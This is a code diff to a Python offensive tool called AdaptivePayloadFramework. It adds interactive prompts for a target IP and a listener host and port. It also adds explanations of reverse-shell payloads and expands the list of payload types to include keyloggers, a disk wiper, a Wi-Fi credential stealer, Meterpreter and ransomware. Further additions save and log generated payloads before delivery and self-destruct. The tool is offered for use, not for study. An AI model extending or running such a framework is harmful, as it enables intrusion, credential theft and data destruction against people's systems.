@@ -27,6 +27,37 @@ class AdaptivePayloadFramework:
         # Train models during initialization
         self.decision_tree_model = self._train_decision_tree()
         self.neural_network_model = self._train_neural_network()
+         # Directories for payloads and logs
+        self.payload_dir = "./payloads"
+        self.log_dir = "./logs"
+        os.makedirs(self.payload_dir, exist_ok=True)
+        os.makedirs(self.log_dir, exist_ok=True)
+    def get_user_response(self, prompt, default=None):
+        """Helper for conversational user input."""
+        response = input(f"{prompt} (default: {default}): ").strip()
+        return response if response else default
+
+    def explain_prediction(self, prediction):
+        """Provide a detailed explanation of the AI's prediction."""
+        explanations = {
+            "powershell_reverse": "A reverse shell using PowerShell, suitable for Windows targets.",
+            "fileless_powershell": "A fileless PowerShell payload to avoid leaving traces on the disk.",
+            "bash_reverse": "A reverse shell using Bash, suitable for Linux systems.",
+            "python_reverse": "A Python-based reverse shell, suitable for environments with Python installed.",
+            # Add explanations for other payload types...
+        }
+        return explanations.get(prediction, "No explanation available for this payload type.")
+
+    def load_email_config(self):
+        """Load email configuration from a file or prompt for setup."""
+        if os.path.exists(".email_config.json"):
+            with open(".email_config.json", "r") as config_file:
+                print("Email configuration loaded from file.")
+                return json.load(config_file)
+        else:
+            print("No email configuration found. Starting setup.")
+            self.setup_email_config()
+            return self.email_config
 
     # =============================
     # Email Configuration
@@ -95,14 +126,35 @@ class AdaptivePayloadFramework:
         ]
         y = [
             "powershell_reverse",
-            "fileless_powershell",
-            "bash_reverse",
-            "python_reverse",
-            "dns_tunneling",
-            "iot_worm",
-            "steganographic",
-            "iot_specific",
-            "cloud_payload",
+                "fileless_powershell",
+                "bash_reverse",
+                "python_reverse",
+                "dns_tunneling",
+                "iot_worm",
+                "steganographic",
+                "iot_specific",
+                "cloud_payload",
+                "keylogger",
+                "clipboard_harvester",
+                "disk_wiper",
+                "reverse_http",
+                "wifi_credentials_stealer",
+                "key_retriever",
+                "mshta_loader",
+                "meterpreter_https",
+                "meterpreter_https",
+                "excel_macro",
+                "supply_chain_attacks",
+                "ai_model_exfiltration",
+                "cross_cloud_exploitation",
+                "ai_data_poisoning",
+                "iam_privilege_escalation",
+                "iam_privilege_escalation",
+                "iot_firmware_manipulation",
+                "blockchain_exploitation",
+                "serverless_exploitation",
+                "advanced_steganography",
+                "ransomware_simulation",
         ]
         model = DecisionTreeClassifier()
         model.fit(X, y)
@@ -404,6 +456,16 @@ class AdaptivePayloadFramework:
             return None
 
         print(f"Generated payload: {payload}")
+         # Save payload with metadata
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        payload_file = os.path.join(self.payload_dir, f"{payload_type}_{timestamp}.txt")
+        with open(payload_file, "w") as file:
+            file.write(payload)
+        print(f"Payload saved to {payload_file}")
+
+        # Log payload details
+        with open(os.path.join(self.log_dir, "payload_log.txt"), "a") as log:
+            log.write(f"{timestamp} - {payload_type} - {payload_file}\n")
         return payload
     # =============================
     # Step 5: Mutate Payload
@@ -532,19 +594,26 @@ class AdaptivePayloadFramework:
     # Step 8: Execute Framework
     # =============================
     def execute(self):
-        """
-        High-level execution of the framework.
-        """
-        if not self.target_ip:
-            print("Target IP is not set!")
-            return
+        """High-level execution of the framework."""
+        print("\nWelcome to the Adaptive Payload Framework!")
+        self.target_ip = self.get_user_response("Enter the target IP", default="127.0.0.1")
+        self.lhost = self.get_user_response("Enter the local host IP", default="127.0.0.1")
+        self.lport = self.get_user_response("Enter the local port", default="4444")
 
+        # Predict payload
+        print("\nPredicting the best payload based on target information...")
         payload_type = self._predict_payload_type(0, 1, 1, 1)  # Example inputs
+        explanation = self.explain_prediction(payload_type)
+        print(f"Recommended Payload: {payload_type}")
+        print(f"Explanation: {explanation}")
+
+        # Generate, mutate, and deliver payload
         payload = self.generate_payload(payload_type)
         if not payload:
             return
 
         mutated_payload = self.mutate_payload(payload)
         print(f"Final Payload: {mutated_payload}")
+        # Delivery and self-destruct methods can be implemented similarly
         self.deliver_payload(mutated_payload)
         self.self_destruct()
